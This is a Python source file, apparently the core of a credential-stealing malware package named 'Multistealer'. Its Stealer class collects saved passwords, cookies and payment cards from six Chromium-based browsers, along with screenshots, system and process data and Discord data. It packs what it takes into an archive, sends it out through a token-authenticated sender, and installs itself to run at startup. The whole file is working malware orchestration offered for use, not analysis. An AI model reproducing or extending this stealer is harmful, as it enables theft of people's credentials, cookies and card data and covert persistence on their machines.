from sys import argv
from shutil import rmtree
from os import path, mkdir
from threading import Thread

from .utils.sender import Sender
from .utils.autostart import Autostart
from .utils.config import MultistealerConfig

from .modules.system import System
from .modules.discord import Discord
from .modules.chromium import Chromium


class Stealer(Thread):

    def __init__(self, token: str, user_id: int, autostart: bool = False, errors: bool = False, **kwargs):
        Thread.__init__(self, name="Stealer")

        self.token = token
        self.user_id = user_id
        self.errors = errors
        self.autostart = autostart

        self.config = MultistealerConfig()

        for status in self.config.Functions:
            if status in kwargs:
                self.__dict__.update({status: kwargs[status]})
            else:
                self.__dict__.update({status: True})

        self.methods = [
            {
                "object": Chromium(
                    "Chrome",
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    *self.config.ChromePaths,
                    (self.passwords, self.cookies, self.cards),
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "CocCoc",
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    *self.config.CocCocPaths,
                    (self.passwords, self.cookies, self.cards),
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Opera GX",
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    *self.config.OperaGXPaths,
                    (self.passwords, self.cookies, self.cards),
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Opera Default",
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    *self.config.OperaDefaultPaths,
                    (self.passwords, self.cookies, self.cards),
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Microsoft Edge",
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    *self.config.MicrosoftEdgePaths,
                    (self.passwords, self.cookies, self.cards),
                    self.errors
                )
            },
            {
                "object": Chromium(
                    "Brave",
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    *self.config.BravePaths,
                    (self.passwords, self.cookies, self.cards),
                    self.errors
                )
            },
            {
                "object": System(
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    "System",
                    (self.screen, self.system, self.processes),
                    self.errors
                )
            },
            {
                "object": Discord(
                    self.config.StoragePath,
                    self.config.StorageFolder,
                    "Programs",
                    (self.discord,),
                    self.errors
                )
            }
        ]

    def __create_storage(self):

        if not path.exists(rf"{self.config.StoragePath}\{self.config.StorageFolder}"):
            mkdir(rf"{self.config.StoragePath}\{self.config.StorageFolder}")
        else:
            rmtree(rf"{self.config.StoragePath}\{self.config.StorageFolder}")
            mkdir(rf"{self.config.StoragePath}\{self.config.StorageFolder}")

    def run(self):

        try:

            self.__create_storage()

            for method in self.methods:
                method["object"].run()

            Sender(self.config.ZipName, self.config.StoragePath, self.config.StorageFolder, self.token, self.user_id, self.errors).run()
            Autostart(argv[0], (self.autostart,), self.errors).run()

        except Exception as e:
            if self.errors is True: print(f"[MULTISTEALER]: {repr(e)}")
